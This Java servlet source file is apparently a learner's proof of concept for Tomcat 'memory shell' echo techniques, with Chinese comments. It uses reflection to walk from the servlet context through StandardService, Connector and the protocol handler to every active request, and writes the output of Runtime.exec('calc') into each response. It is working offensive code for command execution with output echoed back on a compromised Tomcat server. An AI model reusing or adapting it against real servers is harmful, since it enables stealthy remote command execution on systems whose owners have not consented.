package com.tomcat.memshell.TomcatEcho;

import org.apache.catalina.connector.Connector;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardService;
import org.apache.coyote.RequestInfo;

import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;

/**流程
 WebappClassLoaderBase--->ApplicationContext(getResources().getContext())--->
 StandardService--->Connector--->AbstractProtocol$ConnectoinHandler--->
 RequestGroupInfo(global)--->RequestInfo--->Request--->Response
**/


@WebServlet("/demo")
public class TomcatEcho_General extends HttpServlet {
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

/*
        //这里的代码也是为了获取 standardContext，tomcat8.5.77 测试可以使用。8.5.82之后就不行了，getResources返回值为null
        //WebappClassLoaderBase--->ApplicationContext(getResources().getContext())

        org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
*/
        try {

        //获取运行中的 standardContext，和之前的三个马一样,也可以用上面注释掉的方法，但是我的tomcat版本刚好高了一点，不行。
        //等效流程 WebappClassLoaderBase--->ApplicationContext(getResources().getContext())
            ServletContext servletContext = request.getSession().getServletContext();
            Field servletfield = servletContext.getClass().getDeclaredField("context");
            servletfield.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) servletfield.get(servletContext);
            Field contextfield = applicationContext.getClass().getDeclaredField("context");
            contextfield.setAccessible(true);
            StandardContext standardContext = (StandardContext) contextfield.get(applicationContext);

            /**
                获取 StandardContext 中的 context
                反射获取 ApplicationContext 上下文，因为其为 protected 修饰的
            **/
            Field context = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context");
            context.setAccessible(true);
            ApplicationContext ApplicationContext = (ApplicationContext)context.get(standardContext);

            /**
                反射获取context中的service
            **/
            Field service = Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredField("service");
            service.setAccessible(true);
            StandardService standardService = (StandardService)service.get(ApplicationContext);

            /**
                反射获取service中的connectors
            **/
            Field connectors = Class.forName("org.apache.catalina.core.StandardService").getDeclaredField("connectors");
            connectors.setAccessible(true);
            Connector[] connector = (Connector[])connectors.get(standardService);

            /**
                现在目的是反射获取 AbstractProtocol$ConnectionHandler 实例，这里可以直接反射获取所有的 AbstractProtocol 类集合，
                对其进行遍历时通过 if 找到正确的AbstractProtocol类 （org.apache.coyote.AbstractProtocol$ConnectionHandler）
            **/
/*      我看其他师傅也有这种写法，没研究啥原理，这样写的话，就可以少最外层的for循环和if判断，这里的connectors1[0]就很玄幻，为啥确定在这，因为想在短时间内学完内存马，急着用所以没仔细研究，以后有空回头来研究
            ProtocolHandler protocolHandler = connectors1[0].getProtocolHandler();
            Field handler = org.apache.coyote.AbstractProtocol.class.getDeclaredField("handler");
            handler.setAccessible(true);
            org.apache.tomcat.util.net.AbstractEndpoint.Handler handler1 = (AbstractEndpoint.Handler) handler.get(protocolHandler);
*/
            Class<?>[] AbstractProtocol_list = Class.forName("org.apache.coyote.AbstractProtocol").getDeclaredClasses();

            for (Class<?> aClass : AbstractProtocol_list) {
                if (aClass.getName().length()==52){
                    java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod("getHandler",null);
                    getHandlerMethod.setAccessible(true);

                    /**
                        反射获取global 和 RequestGroupInfo中的 processors
                    **/
                    Field globalField = aClass.getDeclaredField("global");
                    globalField.setAccessible(true);
                    Field processors = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
                    processors.setAccessible(true);

                    /**
                        反射实现了 RequestGroupInfo(global) ，调用方法获取到了全局的 requestGroupInfo
                    */
                    org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(getHandlerMethod.invoke(connector[0].getProtocolHandler(), null));
                    java.util.List<RequestInfo> RequestInfo_list = (java.util.List<RequestInfo>) processors.get(requestGroupInfo);
                    Field req = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
                    req.setAccessible(true);

                    /**
                        这里就遍历每个 requestInfo ，获取他们的req,再获取 response，就能达到回显的目的了
                    * */
                    for (RequestInfo requestInfo : RequestInfo_list) {
                        org.apache.coyote.Request request1 = (org.apache.coyote.Request )req.get(requestInfo);
                        org.apache.catalina.connector.Request request2 = ( org.apache.catalina.connector.Request)request1.getNote(1);
                        org.apache.catalina.connector.Response response2 = request2.getResponse();
                        response2.getWriter().write("TomcatEcho_General Injection success !");
                        InputStream whoami = Runtime.getRuntime().exec("calc").getInputStream();
                        BufferedInputStream bis = new BufferedInputStream(whoami);
                        int b ;
                        while ((b = bis.read())!=-1){
                            response2.getWriter().write(b);
                        }
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        this.doPost(request, response);
    }
    public static Object getObj(Object obj, String attr){
        try {
            Field f = obj.getClass().getDeclaredField(attr);
            f.setAccessible(true);
            return f.get(obj);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}

